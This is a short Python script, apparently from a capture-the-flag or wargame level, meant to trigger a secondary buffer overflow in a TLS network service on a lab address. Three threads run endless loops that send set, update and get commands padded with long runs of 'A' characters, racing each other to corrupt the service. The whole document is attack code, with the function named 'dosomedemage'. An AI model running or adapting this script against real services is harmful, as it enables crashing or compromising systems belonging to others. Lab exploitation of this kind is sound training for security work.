#!/usr/bin/env python
import socket
from struct import *
import time
import ssl
import threading

#secondary bof

TCP_IP = '10.0.0.1'
TCP_PORT = 20006
BUFFER_SIZE = 1024

class myThread (threading.Thread):
    def __init__(self, threadID, name, count):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.count = count
    def run(self):
        print "Starting " + self.name
        dosomedemage(self.name, self.count)
        print "Exiting " + self.name

def dosomedemage(name, count):
	s_plain = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s_plain.connect((TCP_IP, TCP_PORT))
	s = ssl.wrap_socket(s_plain, ca_certs='level06.pem',
                                cert_reqs=ssl.CERT_REQUIRED,
                                ssl_version=ssl.PROTOCOL_TLSv1)
	data = s.recv(BUFFER_SIZE)
	print "%s: %s" % (name, data)

	while True:
		if name in "first":
			s.send("s a %d\n" % (count))
			s.send("A"*count)
			data = s.recv(BUFFER_SIZE)
			print "%s: %s" % (name, data)

		if name in "second":
			s.send("u a %d\n" % (count))
			s.send("A"*count)
			data = s.recv(BUFFER_SIZE)
			print "%s: %s" % (name, data)

		if name in "third":
			s.send("g a\n")
			data = s.recv(BUFFER_SIZE)
			print "%s: %s" % (name, data)
			data = s.recv(BUFFER_SIZE)
			print "%s: %s" % (name, data)

	s.close()

thread1 = myThread(1, "first", 10)
thread2 = myThread(2, "second", 100)
thread3 = myThread(3, "third", 100)

thread1.start()
thread2.start()
thread3.start()
